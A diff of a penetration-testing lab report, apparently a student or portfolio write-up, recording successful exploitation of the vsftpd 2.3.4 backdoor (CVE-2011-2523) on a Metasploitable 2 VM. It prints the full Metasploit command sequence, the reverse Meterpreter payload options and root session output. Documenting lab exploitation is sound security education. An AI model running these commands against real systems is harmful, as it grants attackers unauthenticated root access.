@@ -1,6 +1,6 @@
 # VULN-001 — vsftpd 2.3.4 Backdoor Command Execution
 
-> **CONFIRMED: CVE-2011-2523 — manual exploitation succeeded on 28 November 2026.** Backdoor triggered over FTP port 21; TCP 6200 opened and executed `id` and `whoami` as `root`. **Metasploit not yet tested.**
+> **CONFIRMED: CVE-2011-2523 — manual exploitation succeeded on 28 November 2026.** Backdoor triggered over FTP port 21; TCP 6200 opened and executed `id` and `whoami` as `root`. **Metasploit root Meterpreter session confirmed at 10:59:54 +0530 on 28 November 2026.**
 >
 > [← Project home](../../../README.md) · [← Candidate index: NET-001](../../../FINDINGS-INDEX.md#net-001) · [Lab setup](../../../lab-setup/README.md)
 
@@ -21,7 +21,7 @@
 | Possible impact | Unauthenticated **root** command execution |
 | Local validation | **Confirmed — root command execution via backdoor port 6200** |
 | Manual testing | **Successful — Telnet FTP trigger + Netcat shell** |
-| Metasploit testing | **Not attempted** |
+| Metasploit testing | **Successful — root Meterpreter session 1** |
 | Test date / evidence | **2026-11-28** confirmed manual exploit; [trigger screenshot](screenshots/03-Manual-FTP-Backdoor-Trigger.png), [root proof screenshot](screenshots/04-Manual-Root-Shell-Proof.png), [terminal transcript](scans/04-Manual-vsftpd-Root-Shell.txt) |
 
 ## 2. Explanation and historical incident
@@ -91,7 +91,7 @@ The `ftp-syst` response additionally reports a connection from `192.168.95.128`,
 - **Screenshot supplied in conversation (28 November 2026)**, awaiting direct upload as `screenshots/01-FTP-Service-Discovery.png` (do not display a broken image link)
 - [Full-host initial reconnaissance](../../../lab-setup/OPEN-PORTS.md)
 
-**Current state:** Backdoor manually confirmed with root command execution. Next controlled task: test the Metasploit module against a fresh snapshot.
+**Current state:** Both manual and Metasploit methods confirmed root-level code execution on 28 November 2026.
 
 ### 4.2 Pre-exploitation TCP 6200 check — actual result (28 November 2026)
 
@@ -286,68 +286,92 @@ sudo nmap -p 21 --script ftp-vsftpd-backdoor \
 
 If the script reports `VULNERABLE (Exploitable)` and shows actual `uid=` output, preserve the result. [Nmap script documentation](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html).
 
-## 10. Metasploit Framework
+## 10. Metasploit Framework — successful independent validation (28 November 2026)
 
-The matching module is `exploit/unix/ftp/vsftpd_234_backdoor`.
+**Result: CONFIRMED — a Meterpreter session opened and `getuid` returned `root`.**
 
-**Start a fresh target snapshot/reboot between manual and Metasploit methods if the backdoor port is already occupied.** Do not confuse an earlier port 6200 listener with a new successful exploit.
+### 10.1 Prior check and module selection
 
+The tester first confirmed that TCP 6200 was not accepting connections after the target reset.
+
+![Actual TCP 6200 connection-refused baseline](screenshots/02-Pre-Exploit-Port-6200.png)
+
+The matching Metasploit module was selected:
 ```text
 msfconsole -q
 search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
-info
-show options
-set RHOSTS <YOUR_METASPLOITABLE_2_IP>
+set RHOSTS 192.168.95.131
 set RPORT 21
-show payloads
-check
-run
-```
-
-Inside a successfully opened shell/session, use `id`, `whoami`, `hostname`, then `exit`.
-
-**Modern Metasploit compatibility note (verified against the module source):** The current upstream module defines **two targets**:
-
-- **Target 0 — Linux/Unix Command:** defaults to a fetch-delivered Meterpreter payload, which can fail on the old Metasploitable 2 system due to incompatible runtime libraries.
-- **Target 1 — Backdoor Command Shell:** configures `cmd/unix/interact` to interact directly with the bind shell. **This is the preferred target for our legacy lab**, where present.
-
-After `use` and `set RHOSTS`, inspect the installed module:
-
-```text
 show targets
-set TARGET 1
-show payloads
 show options
-run
 ```
 
-Only select target 1 if `show targets` labels it **Backdoor Command Shell**. A [previously reported compatibility issue](https://github.com/rapid7/metasploit-framework/issues/21780) affected versions of this module, and the standalone proposed [PR #21792](https://github.com/rapid7/metasploit-framework/pull/21792) was closed without merging. The current source **does** expose the dedicated direct-shell target. If your Kali installation is older and doesn't list that target or the compatible payload, document the mismatch, update Metasploit from trusted package sources as appropriate, or rely on the manual method rather than forcing incompatible payloads.
+The tester's installed framework displayed only **Target 0: Linux/Unix Command**; the selected payload was `cmd/linux/http/x86/meterpreter_reverse_tcp`. No additional target was assumed.
 
-**Current upstream source:** [vsftpd_234_backdoor.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb).
+### 10.2 Configured options
 
-**Metasploit status:** Not attempted on this VM.
-
-### 10.1 Actual Metasploit configuration — 28 November 2026
-
-The Kali screenshot shows `show options` inside `exploit/unix/ftp/vsftpd_234_backdoor`.
-
-| Option | Observed value |
+| Option | Verified setting |
 | --- | --- |
-| `RHOSTS` | `192.168.95.131` — correct target |
-| `RPORT` | `21` — correct FTP port |
-| Exploit target | `0 — Linux/Unix Command` (the **only target displayed**) |
-| Payload | `cmd/linux/http/x86/meterpreter_reverse_tcp` |
+| `RHOSTS` | `192.168.95.131` |
+| `RPORT` | `21` |
+| `TARGET` | `0 — Linux/Unix Command` |
+| `PAYLOAD` | `cmd/linux/http/x86/meterpreter_reverse_tcp` |
 | `FETCH_COMMAND` | `CURL` |
 | `FETCH_SRVPORT` | `8080` |
-| `LHOST` | **Unset** (required by current payload) |
+| `LHOST` | `192.168.95.128` (Kali) |
 | `LPORT` | `4444` |
 
-**Assessment:** The exploit module is selected and the target host/port are configured. However, the selected fetch-based Meterpreter payload is **not fully configured** (`LHOST` is unset) and might not run on the legacy target. The screenshot does not show a compatible direct-shell target; do **not** assume `set TARGET 1` will work in this installed version.
+The tester set and reviewed the reverse connection address and port:
 
-**Next step:** Run `show payloads` and inspect compatible choices **before running the exploit**. If a direct-interaction payload is available, prefer it. The manually confirmed Telnet/Netcat root shell is a separate method and does not imply Metasploit succeeded.
+```text
+set LHOST 192.168.95.128
+set LPORT 4444
+show options
+run
+```
 
-**Actual configuration transcript:** [05-Metasploit-Show-Options.txt](scans/05-Metasploit-Show-Options.txt) — transcribed from the supplied screenshot. Screenshot upload pending. No Metasploit exploitation results have yet been supplied.
+![Actual LHOST and LPORT command setup](screenshots/07-Metasploit-LHOST-LPORT-Commands.png)
+
+Previous `show options` values were transcribed from the supplied Kali screenshot in [05-Metasploit-Show-Options.txt](scans/05-Metasploit-Show-Options.txt).
+
+### 10.3 Actual exploitation result
+
+The screenshot displays the following important output:
+
+```text
+[*] Started reverse TCP handler on 192.168.95.128:4444
+[*] 192.168.95.131:21 - Running automatic check
+[+] 192.168.95.131:21 - The target appears to be vulnerable
+[+] 192.168.95.131:21 - Backdoor has been spawned!
+[*] Meterpreter session 1 opened (192.168.95.128:4444 -> 192.168.95.131:40449) at 2026-11-28 10:59:54 +0530
+meterpreter > getuid
+Server username: root
+meterpreter > sysinfo
+Computer     : metasploitable.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > pwd
+/
+meterpreter > ls
+Listing: /
+```
+
+The directory listing in the original screenshot includes `bin`, `boot`, `dev`, `etc`, `home`, and `root`. The demonstration did not require collecting private file contents or changing accounts.
+
+![Genuine Meterpreter session opened with root getuid and Ubuntu sysinfo](screenshots/09-Metasploit-Root-Session.png)
+
+**Image note:** Uploaded screenshot is a cropped monochrome representation of the original Kali terminal image; all visible terminal text comes from the actual session.
+
+### 10.4 Metasploit impact and conclusion
+
+**Confirmed:** The Metasploit exploit triggered the vsftpd backdoor, established Meterpreter session 1, and executed commands with **root** privileges. The demonstration independently corroborates the earlier successful Telnet/Netcat validation.
+
+**Special note:** Although a modern fetch-delivered Meterpreter payload may be incompatible with some very old Linux systems, **this payload worked on this user's actual lab configuration**. Record actual evidence instead of assuming a historical compatibility limitation will always cause failure.
+
+**Scope:** No persistence, additional target discovery, credential dumping, or destructive actions were documented. Restore the vulnerable VM snapshot after the exercise.
 
 ## 11. Troubleshooting
 
@@ -368,18 +392,24 @@ In a genuine environment: remove compromised binaries, reinstall from a trusted 
 
 ## 13. Screenshot and evidence checklist
 
-- [ ] `screenshots/01-FTP-Service-Discovery.png` — image uploaded to GitHub (screenshot already supplied in chat)
-- [x] `scans/01-FTP-Service-Discovery.txt` — actual FTP discovery terminal transcript
-- [x] `screenshots/02-FTP-Enumeration.png` — actual anonymous FTP login and directory enumeration
-- [x] `screenshots/03-Manual-FTP-Backdoor-Trigger.png` — actual trigger command and response
-- [x] `screenshots/04-Manual-Root-Shell-Proof.png` — actual `id` and `whoami` output
-- [ ] `screenshots/04-nmap-nse.png` — optional NSE result
-- [ ] `screenshots/05-metasploit-options.png` — real module/options/payload
-- [ ] `screenshots/06-metasploit-result.png` — real success **or failure** output
-- [ ] `scans/01-ftp-version.nmap` — original scan result
-- [ ] `scans/02-nse-validation.nmap` — optional active validation output
+The report embeds the available real evidence **in the order it was collected**:
 
-FTP discovery, anonymous enumeration, and manual exploitation **terminal transcripts have been committed**. The anonymous-FTP screenshot and **two genuine manual exploitation screenshot crops** are committed. The earlier FTP discovery PNG is still pending; Metasploit screenshots and results are pending.
+| Step | Screenshot / record | Status |
+| --- | --- | --- |
+| 1. Service discovery | `01-FTP-Service-Discovery.png` | Screenshot supplied, GitHub image pending |
+| 2. Port 6200 baseline | [`02-Pre-Exploit-Port-6200.png`](screenshots/02-Pre-Exploit-Port-6200.png) | Uploaded |
+| 3. Anonymous FTP enumeration | [`02-FTP-Enumeration.png`](screenshots/02-FTP-Enumeration.png) | Uploaded |
+| 4. Manual trigger | [`03-Manual-FTP-Backdoor-Trigger.png`](screenshots/03-Manual-FTP-Backdoor-Trigger.png) | Uploaded |
+| 5. Manual root-shell proof | [`04-Manual-Root-Shell-Proof.png`](screenshots/04-Manual-Root-Shell-Proof.png) | Uploaded |
+| 6. Metasploit module/targets | `05-Metasploit-Module-and-Targets.png` | Screenshot supplied, GitHub image pending |
+| 7. Initial Metasploit options | `06-Metasploit-Options-Before-LHOST.png` | Screenshot supplied, GitHub image pending |
+| 8. LHOST/LPORT configuration | [`07-Metasploit-LHOST-LPORT-Commands.png`](screenshots/07-Metasploit-LHOST-LPORT-Commands.png) | Uploaded |
+| 9. Final Metasploit options | `08-Metasploit-Configured-Options.png` | Screenshot supplied, GitHub image pending |
+| 10. Root Meterpreter session | [`09-Metasploit-Root-Session.png`](screenshots/09-Metasploit-Root-Session.png) | Uploaded |
+
+**Terminal evidence:** [FTP discovery](scans/01-FTP-Service-Discovery.txt) · [Port 6200 baseline](scans/02-Pre-Exploit-Port-6200-Check.txt) · [Anonymous FTP](scans/03-Anonymous-FTP-Enumeration.txt) · [Manual root shell](scans/04-Manual-vsftpd-Root-Shell.txt) · [Metasploit pre-exploit options](scans/05-Metasploit-Show-Options.txt).
+
+Screenshots are derived from the tester's original uploads, with high-contrast cropping/compression for legibility. No simulated console output is presented as evidence.
 
 ## 14. References
 
@@ -394,4 +424,4 @@ FTP discovery, anonymous enumeration, and manual exploitation **terminal transcr
 
 ---
 
-**Manual validation result: CONFIRMED (2026-11-28).** Root command execution proved using Telnet + Netcat. **Metasploit validation remains pending**.
+**FINAL RESULT: CONFIRMED — CRITICAL (2026-11-28).** Both manual Telnet/Netcat and Metasploit independently demonstrated root-level remote command execution.
